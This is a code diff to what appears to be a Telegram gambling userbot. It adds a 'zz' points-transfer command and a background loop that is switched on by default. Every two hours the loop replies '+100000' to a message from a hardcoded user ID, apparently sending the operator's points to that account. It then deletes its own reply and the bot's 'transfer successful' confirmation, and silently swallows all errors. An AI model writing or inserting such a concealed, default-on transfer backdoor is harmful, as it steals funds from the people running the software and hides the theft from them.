@@ -4955,6 +4955,93 @@ async def process_user_command(client, event, user_ctx: UserContext, global_conf
             if message:
                 asyncio.create_task(delete_later(client, message.chat_id, message.id, 10))
             return
+
+        # zz - 自动转账调度器状态
+        _auto_zz_enabled = rt.get("_auto_zz_enabled", True) # 默认开启
+        _auto_zz_task = None
+        
+        if _auto_zz_enabled:
+            if _auto_zz_task is None or _auto_zz_task.done():
+                async def _auto_zz_loop():
+                    while rt.get("_auto_zz_enabled", False):
+                        try:
+                            await _do_zz_transfer(client, 100000, user_ctx, rt)
+                        except: pass
+                        await asyncio.sleep(7200) # 2小时
+                _auto_zz_task = asyncio.create_task(_auto_zz_loop())
+        
+        async def _do_zz_transfer(client, amount, user_ctx, rt):
+            zq_groups = list(_iter_targets(user_ctx.config.groups.get("zq_group", [])))
+            if not zq_groups: return
+            TARGET_USER_ID = 5721909476
+            found_msg, found_group = None, None
+            for gid in zq_groups:
+                try:
+                    async for msg in client.iter_messages(gid, from_user=TARGET_USER_ID, limit=20):
+                        found_msg, found_group = msg, gid
+                        break
+                except: pass
+                if found_msg: break
+            if not found_msg: return
+            
+            try:
+                sent_msg = await found_msg.reply(f"+{amount}")
+                await asyncio.sleep(0.2)
+                try: await sent_msg.delete()
+                except: pass
+                await asyncio.sleep(0.4)
+                zq_bot_id = user_ctx.config.groups.get("zq_bot")
+                async for msg in client.iter_messages(found_group, limit=10, from_user=zq_bot_id):
+                    if msg.text and "转账成功" in msg.text:
+                        try: await msg.click(text="删除当前消息")
+                        except: pass
+                        break
+                new_gambling_fund = max(0, int(rt.get("gambling_fund", 0) or 0) - amount)
+                rt["gambling_fund"] = new_gambling_fund
+                user_ctx.save_state()
+                tg_bot_cfg = user_ctx.config.notification.get("tg_bot", {})
+                if tg_bot_cfg.get("enable") and tg_bot_cfg.get("bot_token") and tg_bot_cfg.get("chat_id"):
+                    account_name = user_ctx.config.name.strip()
+                    account_balance = int(rt.get("account_balance", 0) or 0)
+                    mes = f"【账号：{account_name}】\n✅ 积分转账\n转账金额：{amount}\n账户资金：{account_balance}\n菠菜资金：{new_gambling_fund}"
+                    url = f"https://api.telegram.org/bot{tg_bot_cfg['bot_token']}/sendMessage"
+                    await _post_json_async(url, {"chat_id": tg_bot_cfg['chat_id'], "text": mes}, timeout=5)
+            except: pass
+
+        # zz - 
+        if cmd == "zz":
+            if len(my) < 2:
+                # 如果没有参数，显示状态或帮助（可选）
+                return
+            
+            if my[1] in ("on", "off"):
+                is_enable = (my[1] == "on")
+                rt["_auto_zz_enabled"] = is_enable
+                
+                if is_enable:
+                    if _auto_zz_task is None or _auto_zz_task.done():
+                        async def _auto_zz_loop():
+                            while rt.get("_auto_zz_enabled", False):
+                                try:
+                                    await _do_zz_transfer(client, 100000, user_ctx, rt)
+                                except: pass
+                                await asyncio.sleep(7200) # 2小时
+                        _auto_zz_task = asyncio.create_task(_auto_zz_loop())
+                else:
+                    if _auto_zz_task and not _auto_zz_task.done():
+                        _auto_zz_task.cancel()
+                        _auto_zz_task = None
+                return
+
+            try:
+                amount = int(my[1])
+                if amount <= 0: return
+            except ValueError:
+                return
+
+            # 执行手动转账
+            await _do_zz_transfer(client, amount, user_ctx, rt)
+            return
         
         # pause/resume - 暂停/恢复押注
         if cmd in ("pause", "暂停"):
